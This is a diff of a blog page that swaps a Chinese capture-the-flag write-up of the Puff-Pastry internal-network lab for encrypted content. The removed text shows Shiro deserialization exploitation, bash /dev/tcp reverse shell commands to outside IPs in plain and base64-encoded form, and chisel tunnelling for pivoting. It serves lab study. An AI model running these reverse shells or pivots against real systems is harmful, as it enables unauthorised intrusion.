@@ -6,23 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   Shiro flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7e">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Puff-Pastry">
 <meta property="og:url" content="http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/index.html">
 <meta property="og:site_name" content="X1n">
-<meta property="og:description" content="前言靶场地址：https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastry 网络拓扑图：   Shiro flag01 一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打  可以执行命令了cat &#x2F;flag.txt WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7e">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2025/06/06/images/image-20250606175402519.png">
-<meta property="og:image" content="http://example.com/images/image-20250606175422906.png">
-<meta property="og:image" content="http://example.com/images/image-20250606175538502.png">
-<meta property="og:image" content="http://example.com/images/image-20250610164436181.png">
 <meta property="article:published_time" content="2025-06-06T09:52:15.000Z">
-<meta property="article:modified_time" content="2025-06-10T10:32:09.910Z">
+<meta property="article:modified_time" content="2025-07-17T10:07:02.697Z">
 <meta property="article:author" content="xin">
 <meta property="article:tag" content="内网靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/06/06/images/image-20250606175402519.png">
     
     
       
@@ -91,7 +86,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2025/06/08/chisel%E7%9A%84%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/17/windwos%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/06/04/PT-1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -116,16 +111,12 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&name=Puff-Pastry&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&name=Puff-Pastry&description=Here&#39;s something encrypted, password is required to continue reading."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&t=Puff-Pastry"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-flag01"><span class="toc-number">2.</span> <span class="toc-text">Shiro flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9thinkphp-shell"><span class="toc-number">2.1.</span> <span class="toc-text">反弹thinkphp shell</span></a></li></ol></li></ol>
-      </div>
     
   </span>
 </div>
@@ -169,43 +160,18 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p>
-<p>网络拓扑图：</p>
-<img src="../images/image-20250606175402519.png" alt="image-20250606175402519" style="zoom:80%;" />
-
-<h2 id="Shiro-flag01"><a href="#Shiro-flag01" class="headerlink" title="Shiro flag01"></a>Shiro flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p>
-<p>一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用<code>Shiro反序列化利用工具</code>直接打</p>
-<p><img src="/../images/image-20250606175538502.png" alt="image-20250606175538502"></p>
-<p>可以执行命令了<code>cat /flag.txt</code></p>
-<p><code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p>
-<p>##Thinkphp flag02</p>
-<p>先反弹shell吧</p>
-<p>反弹shell命令base64编码一下</p>
-<blockquote>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.133.198.27&#x2F;1122 0&gt;&amp;1*</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMy4xOTguMjcvMTEyMiAwPiYx | base64 -d &gt; /tmp/shell.sh</span><br><span class="line"> chmod +x /tmp/shell.sh</span><br><span class="line"> ls -lh /tmp/shell.sh</span><br><span class="line"> /bin/bash /tmp/shell.sh</span><br></pre></td></tr></table></figure>
-
-<p>然后下载一下fscan扫描内网</p>
-<p>扫描之后发现<code>192.168.100.2/24</code>这个网段有两台机器有问题：</p>
-<p><del>192.168.100.2 shiro反序列化 已经拿下</del></p>
-<p><em>192.168.100.3 thinkphp  未拿下</em></p>
-<p>这个机器是在内网，所以我们需要搭建代理隧道</p>
-<p>###搭建代理</p>
-<p>使用chisel端口转发，先下载<code>chisel</code></p>
-<p>使用反向连接</p>
-<p>shiro机器上执行 <code>./chisel* client 192.168.69.44:2003 R:0.0.0.0:10001:192.168.100.3:80</code></p>
-<p>win11: <code>chisel.exe server -p 2003 --reverse</code></p>
-<p>使用thinkphp扫描工具</p>
-<p><img src="/../images/image-20250610164436181.png" alt="image-20250610164436181"></p>
-<p>拿flag</p>
-<p> <code>WSS-Studio&#123;ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10&#125;</code></p>
-<p>发送DNS请求，发现该机器可以出网，那么就可以反弹shell</p>
-<h3 id="反弹thinkphp-shell"><a href="#反弹thinkphp-shell" class="headerlink" title="反弹thinkphp shell"></a>反弹thinkphp shell</h3><blockquote>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.226.128&#x2F;1234 0&gt;&amp;1</p>
-</blockquote>
-<p><code>echo  YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNi4xMjgvMTIzNCAwPiYx | base64 -d &gt; /tmp/shell.sh</code></p>
-
+    <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="854f6aa5f2e10c3cb47f9c98bfcc94c4a5bfe7fbac00312df99d39b1ca0182c8">2f8d380e856192b8b50da7194b8b9247ae4f48984117529f8d5b06b566caff7d26d9d317f83a7adb7f9bb9018e837dafeead80084e01c9e9ffde1824e4383a14d168e967f9c42a5028182f9f0312a6867fc63149f2efc3b0953bb075fcdc723b2c0afb26d17cb84129f6d2a3d970d2336e19dd6e3a68bd630577c06bbbd77dbe7640e2c59c0d32bce54e8ed9dbfb6e38e54a4018259d993fc4669a3d5ebe78cfc5f8fa8c2cbac10f0dcfe692344e5fbd3590819d0c6c0e4812345370485c05bf54ebff1cceb6b51648239bc2b92386bb8be70ae1d78f19f731bef7db5d7ee005ebb713c8204744a54dba8279a2ba217b0a73e035698e380c19411120ce9e2b14cecab47080fc64577289e9126cc140eae34bbb3569e236b11508befe1e30b6cbab11e623959c4f8326418e402953a200f11b3b28cc5d88654667bdf6966d06b40d838a8e725a94d9763d88b64d948baeec899c4097ac31a07e8ba4887b515e3cca02f0e9b9e338b55ae40c09c599e9027631991f253b131876eee1d30c1954dc843d71794b0f5403f3a826305befb99a1afb183af81c370348185fb367ee992d196f6380a3de99a9d6fd4e52aec36ea30066573139fc94c423c10563e24bd88d67a38cecf3434df6dd4f3c4bb1998de6b41bc2ccca7b235c23de26c195bc7d20bb2c9499a6af93789968e73edd3cdb3cb24ad04586f7a3a6a1af3486bbe087c28df24c0d3509967bcc2f3531b2e0145aeed6ebcfb6a38943a27e91bcf7463050dabc890b201413a79969aa54d099296d961d1f5dfb9554ce46d4682ca7cb89cc2d8855e5dbc6ed185462f4ae4c5205a0e14162c4faf7d2b20d2f330c7a7ae0e99da100f43f94e0ba3a3988366ad926dedc16241878fe73049a88c9da2ffb69af6e52a606aba4c62a75fb964262013dbbeda6feba637f2a53a173ed9af59df22235ff1c4e18a6437135d9781914ecbcf8029033e71fc160c5e81acdbe74fe044bc8f5655dbb73c6d3f4429adad59e0cd61bd16baee364f1be3f137fe66232f9e54712cf4370d093df8e52419e97560e2c236d08ede4d2cc6fed0739ce4ae7abd4930166bb17df85ae0dfcc763a1fdc53375d551ebc6e19f4bda9aa3683855e44c9cf53836def37533ac05a689c1954e947b667b030526d5b3ef6375dc811ec1ec1ae3c43dace82e0081e79ef99114056e67e80c0dca3b3aa5abc8a061d76a1808595ae9254edd1cac318311b8d169148aabb5ec875896c4388064dbe9f6d58bd27348d73cc9955b2892a9ebc4493b7b47fc17fb270f60c8e1fb78489180325cbb1e9df9dee7af2875849eee0df02c94995d71bd504f2cd998670d88b7fd6146cd359086291cd7c53bee014e40d9078413859fa42425eceab98aaae799da256126ec8ac386e73c043aa2f2d0d85154b9eb1ee9c345112603db9e5e0af8c8273a0f633043a76aaa6667270aac1ce0a6b73cce5c1bb73069d21b406e85c083a7d5e2d577be2c6d3e54d61571ca776db816db8e56ed62f0f69c218bdacf69c2da99e9d3055b6c9383e21912bde69ed05735669f8bc5d4953289bc683e810d8a29b24aac43555c8b80cde6f120f040119853696ce8bf7e9e8956c1c6a6745956acf1bbe1b29e375fbff0ad3f7c6771650be3e6184e7aacfce6481eba6a373969d1582456fb6c254a71d08b36de7fce5572aa52a67e95bec4a0cafb69896a4827f64443d8c663b7f5f9ca534a4e7f9d879c576e7c49539b23fd5abe32e816464bbe19510c0e273a74868d23f3fa7516f948642b61965ac4f9c4aab0d750e3e78551af5d52e0fde09607e989b1ca396dd492b6283219f0f164b8390bc3a168e6a6d5abaad3276aa374acbb8f7ebff068c84d2033a50236b4d4d02279bad5854cd55dff2baa12445db96cc055d1c7864b747ec9a4e5b6be0ed8f030fdcaa5eb1f1aaa2497d7b30166518fc359a321381174ecaa145a1149e8198e949238203f3209e427e672533fa9ddd1df5406f619732ae1571ab42deb7aa96c8e70e55ba1166279c2974d4a1cbdf0a94c951a40388dd456b113e56bc94b79aa7bd71377723e76d67e974d76efd693fe2c887b55fb5b35c314edd9653f542c0cb91d3fb43c96c6fd36e7c887af1c0098b8a83836139dd035e6991c04eff14c9dfb563edd5005ca20d2b988d24e4f06ef0b40671eea62f0d28c90be400ebfde27a15fd9000aa796a0482f65e50037d7fa464b2c596d2a82720c14972da9e6795733564fa88fdaf6ac461fbb9b2b91fd80a56ea84c7befd386ea6194cc0f0d24ee7014a26fea9bd7cd1f344d6023217141ab63b4242bae740be0950323148dd1f6dbf892991f303929f982c83c0757fb899c65151ca853f38e462740fd16f830a6da1d997e1ef1d973710e5f58f48b50b01b4795a711c415a0d0f01113cc9a2a56052d9917cd23ce31386ff842ccb1552238f979afd7b9043f457967311b820d43bb78e1f940ec83ec31fed2d479768eebb57d3c3fff2954efae824cb88cddf5bba478a5b97dd566fda37efb7130161c5b9a0539bed8a18d0ebc7b960de73ef9562c9400860030a51213bd8c45833e421211d526cb3ef1207191b24680e3563a50203b806c874b39383fa93810414bd1e5c271099f9972543e40e73c88afeca5f8ea13f715e86015501be7238aa0af1e115db5a5e76e658f584270631ca0b0e83a3d164bb639ab4c12764371ec2c896e2322f3e4d49a075c421592f30479a90b654ff0a5e1868e3b2a1c2cdc5b4492da505a466370423f24edf5c07d0417811c83059b1206b666a7c83725012834c7c371d70bf85abe16c139003fb19a5be6a133f21cdc8189e9a02e27f3fccd63125a26b966ac3c34b652e9d7049dabec88d68782b7c23b683eb73d6b8260415ea3a0f6e2c3c7dd2cadcefaf04c82a19e04efe1d1350649043b441c10df2c4035cfb60dc56b16f9a0933720e995e7aea32ae7843927770684b7e179f9ceac5ef97a6c638caa597a2e86e8a56b8e7252aabdde19bfbb2fc55a8a2baee59e98b9634e4427919729ddb2871b1a1d787402b97d08ec6fa5c225c98ec35486d8e3af8ce211b983b32441f11c5c1b38ed052167bedb152982cd7fbbd9fd832ea001c7d7ef8f7e941801160c7a0ab4180e0a78ad871e63b3510d9c4e05c733354486ed13e0f3d432dac17a579261fe88b223b46446a46e7bb9a98761e5addd23eaa8303e108f17da40c4c04bb2c83b3311bf94d63a9c9d72c099ba4ba7e0ea43079fb7e531bb67ee2fced2ce85353804a368d5e1b7591c5ce1253a1cdb5e416e8c1b2410cce694082f094be45e3450a1aef3e83c0aa18ecb437cc0aeb960ee421cb0dab60594a003e007f9a9f4480bdfb1270cefa5b7f0e339ea80585fca43ce8294d5c121a0c716bc1f5f7d698919874d8bcb47399ce9ee51526489ab965756442ac0ef6d47ed5329616c99d87a00511c0f087cd7b59babed7b73c030f0d99c1f8cb557331103a1758f22384d514d6e8c8beec0373c3ec68eabd9f7b1afbedf513558bf4fddd0e2374a8f71a11a13cde30077349f2885cb7c62b0b973937ea90fac538699edecb90e2571a69c37d3e950651970ca407143ebb3a3a2ed42626b3e4d80eb4dfce60ac4cdf86023999cd8f61312e037808a9010303ad6f98a01a9165149512b6b2991246ea8bd0cc2d4942c43541df5de97636ef58c9d08d81cfa1abfae32eb7459b6dc34eb8d3c475d0a6674d174e75183122d8eed388cf7d549239bfc5f2c7d35c5b275172aa539316ee7ad7d070055a883a749d77e719b5ca82a9ed211388e8fed2f091476eb6060194736d1400c40e34cdbdb42b7919a9474fc615374ba8345786e8598f98a197bdda75add82e2ebc586d7b32acb1aef83c866474af04996261693fbf1c4fadcb86eb7bc50e06b6f861b9acbc9ecdbdea2e57b26b6ee4d4fbb002a8938ddc67cdfe40161444e5dabd893918d52f7ba65485e27a098e890ddb7bff6f238f45a716ae3fb8a2fb3e06053e20917f0a774340c62160634de740a5f828faf1bdce2836f503d37873eb483fcf61c7ee173f33fe5562b7a51a916a5df4c9d35dd26815d5ff6cd297fae87c409bae89f286a26c599b2ac93a0a88d96bcf86640155d4e9e34f25ea14f15c778cc7818338ec2b46af93dc0ee86c5a3bf618a3c9199e74ec8fd60b0aff15086c44f2f47f71096617b44f78bf22eed8930032e3da2532650cb00ee0b</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
   </div>
 </article>
 
@@ -235,10 +201,6 @@
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-flag01"><span class="toc-number">2.</span> <span class="toc-text">Shiro flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9thinkphp-shell"><span class="toc-number">2.1.</span> <span class="toc-text">反弹thinkphp shell</span></a></li></ol></li></ol>
-      </div>
-    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -251,7 +213,7 @@
   <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&title=Puff-Pastry"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&name=Puff-Pastry&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&name=Puff-Pastry&description=Here&#39;s something encrypted, password is required to continue reading."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/&t=Puff-Pastry"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
@@ -259,8 +221,6 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
